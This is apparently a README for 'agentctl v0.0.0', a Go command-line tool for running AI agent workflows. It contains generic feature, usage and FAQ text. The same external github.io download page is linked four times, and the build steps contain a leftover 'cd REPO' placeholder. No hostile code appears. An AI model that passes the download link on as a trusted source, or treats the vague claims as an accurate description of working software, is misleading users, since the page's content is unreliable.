# agentctl v0.0.0 - AI agent workflow tool 2026

> **agentctl is a Go-based CLI for assembling and running AI agent workflows with portable folders, shell automation, and live configuration updates.**

[![Platform](https://img.shields.io/badge/Platform-Go-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/moorematt89/agentctl-go-cli-tool?style=flat-square)](https://github.com/moorematt89/agentctl-go-cli-tool)

---

<p align="center">
  <a href="https://moorematt89.github.io/agentctl-go-cli-tool/">
    <img src="https://img.shields.io/badge/Download-agentctl%20Latest-brightgreen?style=for-the-badge" alt="Download agentctl">
  </a>
</p>

> **[Direct Download - agentctl v0.0.0](https://moorematt89.github.io/agentctl-go-cli-tool/)**

---

[Download Latest Build](https://moorematt89.github.io/agentctl-go-cli-tool/)

---

## What agentctl Does

agentctl is a command-line tool for organizing AI agent work in a repeatable, structured way. It is built for people who want to define agent behavior, run shell-based actions, and keep each step of a workflow inside portable folders that can be moved across environments.

It is especially useful in automation-focused setups where chat-style interaction, long-lived daemon execution, session history, and logs all need to stay together. With model listing and hot-reload configuration support, agentctl lowers the overhead of iterating on local agent tooling and task orchestration.

---

## Core Capabilities

- Layered workflow building with composable AI agents
- Portable agent folders that move with your setup
- Bash tool execution for scripted operations
- Shell command orchestration for automation tasks
- Chat mode for interactive agent sessions
- Daemon mode for background workflow execution
- Hot-reload configuration for faster iteration
- Model listing along with session and logging support

---

## Installation

Clone the repository and build it with Go:

`git clone https://github.com/moorematt89/agentctl-go-cli-tool.git
`cd REPO`
`go build ./...`

If you prefer a release binary, download it, then either add it to your PATH or run it straight from the extracted directory.

---

## Usage

Begin by creating or opening an agent folder, then pick the mode that matches what you are trying to do.

Common examples:

`agentctl chat`
`agentctl daemon`
`agentctl models`

For scripted workflows, direct agentctl toward the shell commands or bash tools you want it to run, then watch the session output and logs as the work progresses.

---

## Configuration

Configuration is usually stored alongside the agent folder so the setup remains portable. Edit the config file, then reload it when you need changes to take effect without restarting the full workflow.

Example structure:

`agentctl.yaml`
`agents/`
`logs/`
`sessions/`

When managing more than one agent, keep each folder isolated so models, commands, and session data stay easy to follow.

---

## Requirements

- Go runtime for building and running from source
- A supported shell environment for command execution
- Access to the local filesystem for agent folders, sessions, and logs
- Enough storage for workflow files, logs, and saved session history
- A model provider or local model setup compatible with your workflow

---

## FAQ

**How do I get updates?**  
Download the latest build from the link above, or rebuild from source whenever you want a fresh release.

**Where do I change settings?**  
Keep configuration inside the agent folder so it stays portable and simple to move.

**What if a command does not run as expected?**  
Start by checking the shell environment, the command path, and the log output. Session records can also help pinpoint where the workflow stopped.

**Can I use it interactively and in the background?**  
Yes. agentctl supports both chat-driven use and daemon-style operation.

**How do I verify available models?**  
Use the model listing command to see what is available in your current setup.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
